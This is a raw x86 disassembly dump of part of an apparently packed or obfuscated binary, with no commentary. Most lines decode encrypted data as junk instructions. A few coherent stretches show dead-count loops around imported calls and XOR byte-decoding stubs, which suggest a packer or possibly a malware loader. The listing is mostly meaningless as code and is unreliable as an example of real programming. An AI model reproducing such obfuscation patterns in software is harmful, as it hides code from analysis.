  406359:	popa   
  40635a:	hlt    
  40635b:	jnp    0x4062ea
  40635d:	test   eax,0x82cdc0ce
  406362:	cmp    BYTE PTR [ebx+0x4d],bl
  406365:	add    dl,bh
  406367:	mov    ah,0x59
  406369:	and    al,0x5f
  40636b:	mov    bh,0x75
  40636d:	sub    al,0x68
  40636f:	cwde   
  406370:	or     esi,DWORD PTR [edx]
  406372:	xor    BYTE PTR [edi-0x40],ch
  406375:	(bad)  
  406376:	repz pusha 
  406378:	loop   0x406353
  40637a:	sub    al,0x73
  40637c:	aam    0x9c
  40637e:	fcmovnb st,st(7)
  406380:	pop    ss
  406381:	xor    al,0x1c
  406383:	xor    ebx,esp
  406385:	pop    ebx
  406386:	stos   BYTE PTR es:[edi],al
  406387:	push   DWORD PTR [eax-0x1d]
  40638a:	(bad)  [eax-0x263591c6]
  406390:	aam    0xf5
  406392:	pop    eax
  406393:	dec    ecx
  406394:	aaa    
  406395:	shl    DWORD PTR ds:0x9b251426,1
  40639b:	sub    esp,eax
  40639d:	mov    ecx,DWORD PTR [edi]
  40639f:	dec    edx
  4063a0:	add    BYTE PTR [edx-0x6950a705],cl
  4063a6:	call   0xae6df6b1
  4063ab:	ficom  DWORD PTR [eax]
  4063ad:	xor    eax,0xce62a984
  4063b2:	xor    cl,bh
  4063b4:	sub    bl,bh
  4063b6:	(bad)  [eax-0xb8a01]
  4063bc:	jne    0x4063aa
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0x6de0,0xaf
  4063d1:	xchg   edx,eax
  4063d2:	or     dl,ah
  4063d4:	xor    DWORD PTR [esi+0x7e],edi
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x40636f
  4063dc:	imul   DWORD PTR [ebx-0x67d10b0f]
  4063e2:	and    BYTE PTR [ecx+esi*8-0x45ae91c3],bh
  4063e9:	scas   eax,DWORD PTR es:[edi]
  4063ea:	stos   DWORD PTR es:[edi],eax
  4063eb:	jnp    0x406377
  4063ed:	push   edx
  4063ee:	mov    ss,WORD PTR [edi+0x699ce41b]
  4063f4:	jbe    0x406388
  4063f6:	adc    ecx,DWORD PTR [ebp+0x4c]
  4063f9:	test   DWORD PTR [eax-0x64],esp
  4063fc:	repnz fisubr WORD PTR [ebx+0x7f]
  406400:	mov    dh,0x17
  406402:	push   0x10
  406404:	push   edi
  406405:	retf   0xe38a
  406408:	fstp   DWORD PTR [edx]
  40640a:	add    ecx,edx
  40640c:	adc    DWORD PTR [ecx+0x3ceefc5f],edi
  406412:	jb     0x4063bc
  406414:	lods   al,BYTE PTR ds:[esi]
  406415:	into   
  406416:	mov    dh,0xce
  406418:	xchg   esp,eax
  406419:	adc    bl,cl
  40641b:	push   eax
  40641c:	add    ebx,DWORD PTR [ebx+ebp*4+0x2daecaa8]
  406423:	mov    WORD PTR [edx+0xd],es
  406426:	xchg   esi,eax
  406427:	loop   0x40643b
  406429:	int    0xbd
  40642b:	test   BYTE PTR [edx+0x5f5738fb],bl
  406431:	into   
  406432:	cdq    
  406433:	fstp   DWORD PTR ds:0xd43ddfd1
  406439:	and    DWORD PTR [edx-0x6733b451],0x1a1b0d16
  406443:	cs test al,0xd8
  406446:	mov    DWORD PTR [ebx],esp
  406448:	imul   DWORD PTR [edi]
  40644a:	fadd   DWORD PTR [ebx-0x2c456f93]
  406450:	inc    edx
  406451:	cdq    
  406452:	dec    edi
  406453:	scas   al,BYTE PTR es:[edi]
  406454:	pop    esi
  406455:	or     BYTE PTR [edi+0x1cc70f83],bl
  40645b:	leave  
  40645c:	push   0xbbb40c23
  406461:	imul   BYTE PTR [edi-0x7c]
  406464:	inc    ecx
  406465:	jle    0x40643b
  406467:	call   0x4d2a:0x10c70826
  40646e:	sahf   
  40646f:	jae    0x406445
  406471:	pop    eax
  406472:	iret   
  406473:	xchg   ebp,eax
  406474:	push   ds
  406475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406476:	neg    DWORD PTR [eax]
  406478:	mov    al,0x21
  40647b:	repnz inc eax
  40647d:	jmp    0x1e83f615
  406482:	loope  0x4064cc
  406484:	xor    ah,BYTE PTR [ebx]
  406486:	pop    ebx
  406487:	or     DWORD PTR [ebx],edi
  406489:	dec    esp
  40648a:	sub    al,0x66
  40648c:	daa    
  40648d:	cdq    
  40648e:	outs   dx,DWORD PTR ds:[esi]
  40648f:	add    DWORD PTR [eax],ebx
  406491:	xor    DWORD PTR [ebx+0x3c3641c2],esp
  406497:	lahf   
  406498:	xchg   edx,eax
  406499:	xchg   BYTE PTR [esi],ch
  40649b:	stos   BYTE PTR es:[edi],al
  40649c:	out    dx,al
  40649d:	inc    ebp
  40649e:	mov    dh,0xf9
  4064a0:	mov    ds:0xc2791c0,eax
  4064a5:	int    0x77
  4064a7:	js     0x40644d
  4064a9:	int3   
  4064aa:	fnstcw WORD PTR [ecx]
  4064ac:	mov    ecx,0x4c42506e
  4064b1:	jbe    0x4064c4
  4064b3:	stc    
  4064b4:	xor    ecx,DWORD PTR [ecx]
  4064b6:	(bad)  
  4064b7:	jne    0x40648b
  4064b9:	je     0x4064f5
  4064bb:	in     al,0x44
  4064bd:	inc    esi
  4064be:	data16 mov al,0xc
  4064c1:	rcl    ch,1
  4064c3:	push   ds
  4064c4:	test   bh,ch
  4064c6:	call   0x7aad2bfd
  4064cb:	dec    edx
  4064cc:	frstor [eax]
  4064ce:	fiadd  DWORD PTR [eax-0x4c2ff2ed]
  4064d4:	xor    bl,BYTE PTR [eax]
  4064d6:	cmp    eax,0xfb8b38a8
  4064db:	mov    ah,BYTE PTR [ebx-0x18]
  4064de:	fcomp  DWORD PTR es:[ecx-0x5d0dee0d]
  4064e5:	adc    al,0x1
  4064e7:	jo     0x406488
  4064e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064ea:	mov    al,0x58
  4064ec:	xchg   esi,eax
  4064ed:	jmp    0x406569
  4064ef:	jge    0x406522
  4064f1:	fcmovbe st,st(5)
  4064f3:	dec    ecx
  4064f4:	mov    ah,0x40
  4064f6:	pop    ebp
  4064f7:	int3   
  4064f8:	xchg   edx,eax
  4064f9:	(bad)  
  4064fa:	std    
  4064fb:	mov    eax,ds:0x9179b33c
  406500:	xor    eax,0xd2f94847
  406505:	jecxz  0x4064ee
  406507:	shr    BYTE PTR [edi],cl
  406509:	or     BYTE PTR [esi-0x6b],dh
  40650c:	repnz fs or al,0xe6
  406510:	neg    dh
  406512:	sbb    al,0xc8
  406514:	arpl   WORD PTR ds:0x3b4b045e,bp
  40651a:	push   ebp
  40651b:	mov    al,ds:0x8db986a9
  406520:	addr16 and eax,0x36ca2f17
  406526:	fdiv   QWORD PTR [ebx-0x65]
  406529:	add    BYTE PTR [edx-0x5d7ea39],al
  40652f:	adc    BYTE PTR [edx+0x35],al
  406532:	stos   BYTE PTR es:[edi],al
  406533:	pop    ss
  406534:	lods   eax,DWORD PTR fs:[esi]
  406536:	and    BYTE PTR [edi+0x50],al
  406539:	dec    edx
  40653a:	and    dl,BYTE PTR [esi+0x734a9678]
  406540:	or     al,0xd
  406542:	mul    DWORD PTR [edi-0x2f8553c]
  406548:	mov    al,0x15
  40654a:	test   DWORD PTR [ebx+ebp*1+0x3427b4d5],eax
  406551:	fisttp QWORD PTR [esp+eiz*4]
  406554:	(bad)
  406557:	rol    bh,1
  406559:	call   0xf48ac14
  40655e:	xchg   ecx,eax
  40655f:	int    0x59
  406561:	pop    ebx
  406562:	scas   al,BYTE PTR es:[edi]
  406563:	add    BYTE PTR [ecx+0x5928b96a],0xdd
  40656a:	push   edx
  40656b:	out    0xa7,al
  40656d:	imul   esp,DWORD PTR [eax+0x4eafe821],0xb051fa24
  406577:	sub    eax,0xd1e53d07
  40657c:	xchg   ecx,eax
  40657d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40657e:	mov    edx,0x7bc4bf53
  406583:	xor    eax,edx
  406585:	(bad)  
  406586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406587:	mov    ch,0xa4
  406589:	pop    ebx
  40658a:	imul   ebp,DWORD PTR [ebx+0x5a25c3b6],0x33
  406591:	mov    ch,0x6b
  406593:	and    ecx,DWORD PTR [eax-0x3d]
  406596:	pop    ecx
  406597:	xchg   esi,eax
  406598:	pop    edx
  406599:	mov    ds:0x3a9fc721,eax
  40659e:	jb     0x406611
  4065a0:	(bad)  
  4065a2:	les    ebp,FWORD PTR [esp+eiz*2-0x53]
  4065a6:	mov    dl,0xc4
  4065a8:	sbb    DWORD PTR [ebx],0xb2417a70
  4065ae:	push   eax
  4065af:	or     BYTE PTR [edx],al
  4065b1:	mov    edi,0x864445cb
  4065b6:	call   0x404d49
  4065bb:	test   eax,eax
  4065bd:	je     0x4065e8
  4065c3:	lea    eax,[ebp-0x78]
  4065c6:	push   eax
  4065c7:	mov    eax,DWORD PTR [ebp-0x14]
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1-0x73575f1a]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x406631
  40660b:	pop    esi
  40660c:	inc    edx
  40660d:	(bad)  
  40660e:	xlat   BYTE PTR ds:[ebx]
  40660f:	mov    eax,ds:0x8c6a8f40
  406614:	inc    edx
  406615:	sub    bh,BYTE PTR [esi]
  406617:	retf   0x9956
  40661a:	shr    DWORD PTR [edx+ecx*8-0x3c733d98],1
  406621:	dec    edi
  406622:	jecxz  0x40669d
  406624:	push   edx
  406625:	sub    al,0xfe
  406627:	jle    0x4065f3
  406629:	fucomip st,st(0)
  40662b:	push   esi
  40662c:	ja     0x406634
  40662e:	inc    edi
  40662f:	xchg   ebx,eax
  406630:	jecxz  0x406662
  406632:	mov    eax,DWORD PTR [eax+0x32d62db6]
  406638:	leave  
  406639:	cmp    bl,BYTE PTR [ecx-0x235066da]
  40663f:	mov    al,0xaf
  406641:	inc    eax
  406642:	outs   dx,DWORD PTR ds:[esi]
  406643:	sub    bl,BYTE PTR [esi+0x591a056f]
  406649:	dec    edx
  40664a:	dec    esi
  40664b:	loope  0x406650
  40664d:	pop    ds
  40664e:	inc    ebp
  40664f:	jmp    0x8a246583
  406654:	enter  0xb9a6,0xd
  406658:	lahf   
  406659:	(bad)  
  40665a:	pop    esp
  40665b:	popa   
  40665c:	adc    eax,0xaa527da
  406661:	mov    cl,0x2e
  406663:	inc    ecx
  406664:	and    esp,DWORD PTR [edi+0x72]
  406667:	sub    ecx,DWORD PTR [esi]
  406669:	imul   edi,esi,0x897e8195
  40666f:	jns    0x40662d
  406671:	xchg   edi,eax
  406672:	cli    
  406673:	xor    BYTE PTR [edi-0x3fc89941],bh
  406679:	dec    esi
  40667a:	ins    DWORD PTR es:[edi],dx
  40667b:	and    BYTE PTR [ebp+0x3f],0x6
  40667f:	pushf  
  406680:	rcr    BYTE PTR [edx+0x1a7db038],cl
  406686:	stc    
  406687:	dec    eax
  406688:	out    dx,eax
  406689:	cs pusha 
  40668b:	js     0x406660
  40668d:	rdmsr  
  40668f:	jmp    0x7c54:0xa85ccc1c
  406696:	repnz cs pop ebx
  406699:	push   edi
  40669a:	mov    dl,0xd5
  40669c:	pop    eax
  40669d:	mov    eax,ds:0x64301866
  4066a2:	stos   DWORD PTR es:[edi],eax
  4066a3:	out    dx,eax
  4066a4:	jnp    0x40666b
  4066a6:	cmp    eax,0xd6a71191
  4066ab:	sub    eax,DWORD PTR [ecx+0x1bf91ce2]
  4066b1:	addr16 jmp 0x406675
  4066b4:	jle    0x4066ea
  4066b6:	pop    eax
  4066b7:	(bad)  
  4066b8:	(bad)  
  4066ba:	imul   edx,DWORD PTR [esi+0x53892870],0x62
  4066c1:	xchg   BYTE PTR [edx],ch
  4066c3:	call   0xbbb9:0xf693cd40
  4066ca:	jnp    0x406703
  4066cc:	xor    al,0x3f
  4066ce:	push   cs
  4066cf:	pushf  
  4066d0:	jl     0x4066f4
  4066d2:	mov    eax,DWORD PTR [ebp+0x48ca6dd]
  4066d8:	test   BYTE PTR [edi+0x11220766],al
  4066de:	rcl    DWORD PTR [edx-0x39ba0d38],1
  4066e4:	call   0xc770:0x35ddc238
  4066eb:	cmp    BYTE PTR [ebp-0x7b],0x5d
  4066ef:	ds std 
  4066f1:	mov    ds:0x70462c,al
  4066f6:	arpl   si,di
  4066f8:	cwde   
  4066f9:	clc    
  4066fa:	xor    esi,DWORD PTR [ebx+0x4ce2de5d]
  406700:	(bad)  
  406702:	fcomp  DWORD PTR [esi]
  406704:	(bad)  
  406705:	pop    esp
  406706:	mov    DWORD PTR [ecx+0x18a8938e],ebp
  40670c:	(bad)  
  40670d:	in     al,0x67
  40670f:	loope  0x40676a
  406711:	jnp    0x406757
  406713:	sti    
  406714:	or     BYTE PTR [edi+0x6c],cl
  406717:	jle    0x406717
  406719:	xor    DWORD PTR [edx+0x1a],0xd9e43c8a
  406720:	shl    BYTE PTR [ebx+0x4b],1
  406723:	rcr    DWORD PTR [edi],0xfc
  406726:	xchg   edx,eax
  406727:	sbb    al,0xf4
  406729:	mov    ds:0x1e67431e,eax
  40672e:	lahf   
  40672f:	dec    esi
  406730:	(bad)  
  406731:	into   
  406732:	out    0x38,al
  406734:	dec    eax
  406735:	inc    ebp
  406736:	jne    0x4066e3
  406738:	loop   0x406772
  40673a:	xchg   ebx,eax
  40673b:	arpl   WORD PTR [esi],ax
  40673d:	push   esi
  40673e:	xor    BYTE PTR [ebx],ch
  406740:	push   ebx
  406741:	repnz fs dec esi
  406744:	jbe    0x406777
  406746:	mov    WORD PTR [eax-0x3],fs
  406749:	loope  0x4066f9
  40674b:	mov    DWORD PTR [ecx+0x57067ac6],esi
  406751:	cwde   
  406752:	jne    0x4066f6
  406754:	mov    ds:0x7989ce62,al
  406759:	xor    al,0x3b
  40675b:	repnz mov edx,0xf00b9f6f
  406761:	lahf   
  406762:	pop    es
  406763:	or     ah,BYTE PTR [esi+0x5baae1f0]
  406769:	scas   eax,DWORD PTR es:[edi]
  40676a:	mov    ecx,0x99ffe808
  40676f:	les    ebx,FWORD PTR [edx+0xd]
  406772:	push   ss
  406773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406774:	or     esp,esi
  406776:	push   DWORD PTR [ebx-0x7c368d07]
  40677c:	jno    0x4067b4
  40677e:	clc    
  40677f:	xor    ebx,ebx
  406781:	out    dx,al
  406782:	repnz pop ds
  406784:	frstor ss:[edi]
  406787:	shl    BYTE PTR [eax],1
  406789:	sub    ebx,DWORD PTR [esi]
  40678b:	popf   
  40678c:	pop    es
  40678d:	push   ss
  40678e:	sahf   
  40678f:	mov    edx,0x33dd04f0
  406794:	inc    ebx
  406795:	and    al,0x14
  406797:	or     al,0xc2
  406799:	sub    edx,DWORD PTR [ebx-0x49]
  40679c:	push   ecx
  40679d:	or     esi,DWORD PTR [eax+0x14]
  4067a0:	icebp  
  4067a1:	xchg   sp,ax
  4067a3:	aam    0x94
  4067a5:	lods   al,BYTE PTR ds:[esi]
  4067a6:	mov    ds:0xb8105312,al
  4067ab:	fwait
  4067ac:	pop    ebp
  4067ad:	imul   edx,DWORD PTR [eax-0x2adc66ed],0x17463a04
  4067b7:	sbb    ebx,esi
  4067b9:	xlat   BYTE PTR ds:[ebx]
  4067ba:	add    al,0x5
  4067bc:	mov    ebp,0x5c81cd3
  4067c1:	xchg   edi,eax
  4067c2:	push   edx
  4067c3:	and    DWORD PTR [edx-0x67e371b],esi
  4067c9:	jp     0x4067fe
  4067cb:	scas   al,BYTE PTR es:[edi]
  4067cc:	push   ds
  4067cd:	fdivr  QWORD PTR [edi+eiz*2-0x71fcbc87]
  4067d4:	pop    edi
  4067d5:	mov    ds:0x60c25c81,al
  4067da:	dec    esp
  4067db:	scas   al,BYTE PTR es:[edi]
  4067dc:	jmp    0x1a800f90
  4067e1:	and    ebx,DWORD PTR [ebx]
  4067e3:	js     0x4067f0
  4067e5:	mov    eax,0xffcd8d65
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0xe6a3:0x345af6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	cli    
  406865:	out    0xde,al
  406867:	fs nop
  406869:	jo     0x4068d2
  40686b:	fldcw  WORD PTR [ebx-0x69feba65]
  406871:	ret    0x1156
  406874:	leave  
  406875:	push   esp
  406876:	xor    edi,edi
  406878:	retf   
  406879:	jge    0x40683b
  40687b:	add    eax,0x7af6b278
  406880:	outs   dx,BYTE PTR ds:[esi]
  406881:	jge    0x406855
  406883:	loop   0x40688c
  406885:	outs   dx,DWORD PTR ds:[esi]
  406886:	shl    DWORD PTR [ebp+0x21],1
  406889:	iret   
  40688a:	jae    0x406908
  40688c:	xchg   ebp,eax
  40688d:	sub    al,0x72
  40688f:	sbb    bh,dh
  406891:	gs mov edx,0xdf63babf
  406897:	dec    ecx
  406898:	call   0xd5f16a33
  40689d:	shl    DWORD PTR [ebp*4-0x5098da1e],cl
  4068a4:	(bad)  
  4068a5:	push   edx
  4068a6:	test   eax,0x114a6c50
  4068ab:	jle    0x406848
  4068ad:	jmp    0x276b:0x8679a2ea
  4068b4:	add    ecx,0xffffffa8
  4068b7:	or     eax,0x1fbc811e
  4068bc:	mov    dl,0x8f
  4068be:	push   es
  4068bf:	sub    edi,DWORD PTR [edi-0x780a9ee2]
  4068c5:	adc    al,0x65
  4068c7:	lock clc 
  4068c9:	sti    
  4068ca:	add    edx,DWORD PTR [ebp-0x32]
  4068cd:	in     al,0xbc
  4068cf:	push   0xffffffe0
  4068d1:	lock outs dx,BYTE PTR cs:[esi]
  4068d4:	pop    esp
  4068d5:	enter  0x6483,0x57
  4068d9:	retf   
  4068da:	enter  0xfac9,0x2c
  4068de:	loop   0x4068f3
  4068e0:	and    DWORD PTR [esi+0x523611ff],edi
  4068e6:	scas   eax,DWORD PTR es:[edi]
  4068e7:	inc    eax
  4068e8:	dec    ebp
  4068e9:	jae    0x4068d8
  4068eb:	xchg   BYTE PTR [ebp+0x51],cl
  4068ee:	mov    bh,0xe2
  4068f0:	fsub   QWORD PTR [ecx-0x66]
  4068f3:	fidivr WORD PTR [esi-0x54b4167]
  4068f9:	mov    edi,0xf9048f11
  4068fe:	jo     0x4068c4
  406900:	fwait
  406901:	std    
  406902:	cmp    eax,0x8ca64f90
  406907:	and    BYTE PTR [eax+ebx*8-0x6aa82a5e],ch
  40690e:	pop    esi
  40690f:	out    dx,al
  406910:	loopne 0x406968
  406912:	and    al,0x18
  406914:	mov    al,ds:0xdafeed7a
  406919:	jmp    0x406999
  40691b:	enter  0xae6e,0x9b
  40691f:	arpl   WORD PTR [edi],si
  406921:	sbb    DWORD PTR [ebx-0x7b9a02a6],ebx
  406927:	xchg   ebp,eax
  406928:	(bad)  
  406929:	mov    cl,0xc
  40692b:	repz cmp cl,BYTE PTR [esi-0x5a8a7317]
  406932:	jle    0x406913
  406934:	dec    esi
  406935:	mov    ds:0x37f54672,eax
  40693a:	push   ebx
  40693b:	rcr    BYTE PTR [eax],1
  40693d:	sub    BYTE PTR [edi],0x71
  406940:	inc    ebp
  406941:	add    esi,esi
  406943:	cmp    bl,BYTE PTR [eax]
  406945:	sub    eax,DWORD PTR [edx+ebx*1]
  406948:	adc    al,0xbc
  40694a:	inc    edi
  40694b:	pop    ecx
  40694c:	std    
  40694d:	mov    dh,0x7b
  40694f:	into   
  406950:	sub    eax,0x5bf1e913
  406955:	or     DWORD PTR [ecx+ebp*8-0x53aef58b],esp
  40695c:	xchg   esi,eax
  40695d:	xor    BYTE PTR [esi+esi*4],bh
  406960:	enter  0x9db8,0x8b
  406964:	or     ch,ch
  406966:	push   ds
  406967:	sub    bh,ah
  406969:	jecxz  0x4069e9
  40696b:	push   ecx
  40696c:	fwait
  40696d:	mov    ecx,0x7082193
  406972:	push   0x5c
  406974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406975:	mov    DWORD PTR [edx],0x51504e0
  40697b:	out    0x91,eax
  40697d:	push   edi
  40697e:	adc    DWORD PTR [ecx-0x55271f47],edx
  406984:	xor    eax,0x7c54573e
  406989:	pop    esp
  40698a:	pop    edx
  40698b:	or     al,0x96
  40698d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40698e:	push   es
  40698f:	neg    edi
  406991:	push   esi
  406992:	loopne 0x40695b
  406994:	out    dx,eax
  406995:	cmp    al,0x2d
  406997:	xchg   edx,eax
  406998:	mov    esi,0xd9d73dbc
  40699d:	and    eax,0x10459f9d
  4069a2:	pop    ecx
  4069a4:	jno    0x4069f5
  4069a6:	out    0x23,al
  4069a8:	fidiv  DWORD PTR [eax+0x76534949]
  4069ae:	sar    DWORD PTR [ebx+esi*4-0x3],1
  4069b2:	pop    ebx
  4069b3:	push   es
  4069b4:	stc    
  4069b5:	push   ds
  4069b6:	dec    edi
  4069b7:	mov    ah,bl
  4069b9:	imul   ecx,DWORD PTR [edx],0xfffffff8
  4069bc:	mov    ah,0xa1
  4069be:	xchg   edi,eax
  4069bf:	sub    dh,BYTE PTR [ebx+0x32ec4554]
  4069c5:	jne    0x406a0c
  4069c7:	std    
  4069c8:	lock pop eax
  4069ca:	mov    eax,ds:0xe38eb6f9
  4069cf:	stos   BYTE PTR es:[edi],al
  4069d0:	imul   ebx,DWORD PTR [ebx-0x6a],0x185e55f3
  4069d7:	repz scas eax,DWORD PTR es:[edi]
  4069d9:	iret   
  4069da:	pop    ebp
  4069db:	adc    al,bl
  4069dd:	pop    ebx
  4069de:	mov    ebp,0xe3bf1def
  4069e3:	cmp    al,0xfe
  4069e5:	xchg   ebx,eax
  4069e6:	sbb    esp,DWORD PTR [edi+0x2b23589c]
  4069ec:	loope  0x4069f9
  4069ee:	fild   WORD PTR [esi]
  4069f0:	stos   DWORD PTR es:[edi],eax
  4069f1:	repnz xor ebx,0x6a3e7328
  4069f8:	sbb    DWORD PTR [ebx+0x2],edi
  4069fb:	(bad)  
  4069fc:	pushf  
  4069fd:	and    al,0x19
  4069ff:	jo     0x4069c7
  406a01:	outs   dx,BYTE PTR ds:[esi]
  406a02:	pop    ds
  406a03:	int3   
  406a04:	fadd   QWORD PTR [edi-0x1f624fa4]
  406a0a:	push   ss
  406a0b:	enter  0xa9d6,0xa2
  406a0f:	xchg   esi,eax
  406a10:	add    ebx,DWORD PTR [ebx]
  406a12:	cmp    eax,0xc161c656
  406a17:	shl    BYTE PTR [esi-0x7b],cl
  406a1a:	test   al,0x15
  406a1c:	pop    esi
  406a1d:	and    ebx,DWORD PTR [eax]
  406a1f:	lods   eax,DWORD PTR ds:[esi]
  406a20:	mov    al,ds:0x91a16073
  406a25:	mov    cl,0x90
  406a27:	ss mov edx,0x46aa08ba
  406a2d:	mov    edx,0xcee1f489
  406a32:	retf   0x82e
  406a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a36:	retf   0xdca7
  406a39:	scas   eax,DWORD PTR es:[edi]
  406a3a:	ja     0x406a28
  406a3c:	or     eax,0xff58c1e0
  406a41:	push   eax
  406a42:	add    DWORD PTR [ebx+0xd8be045],ecx
  406a48:	and    al,0x22
  406a4a:	inc    ecx
  406a4b:	add    BYTE PTR [ecx],al
  406a4d:	or     BYTE PTR [edi+0x5e],bl
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ec63,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ec63,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ec63,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ea9b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ec63
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ec63,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x430367
  406aa5:	xor    edi,DWORD PTR ds:0x4302b5
  406aab:	mov    DWORD PTR ds:0x430367,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x4302dd,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x4302dd
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x4302dd,ecx
  406ad3:	cmp    DWORD PTR ds:0x4302dd,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e737
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ea9f
  406af9:	cmp    DWORD PTR ds:0x4302dd,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x43035f,0x15
  406b1d:	cmp    DWORD PTR ds:0x43035f,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x43035f,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e85f
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x43035f
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x43035f,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x4302b5,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x430357,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x430357
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x430357,ecx
  406b87:	cmp    DWORD PTR ds:0x430357,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x430357,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e666
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42e927
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e648
  406bcd:	add    DWORD PTR ds:0x4302bd,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42ec4b
  406bdf:	and    edi,DWORD PTR ds:0x430363
  406be5:	mov    DWORD PTR ds:0x42ec4b,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0x9b847504
  406bfe:	pop    esp
  406bff:	ret    0x3a65
  406c02:	jle    0x406c82
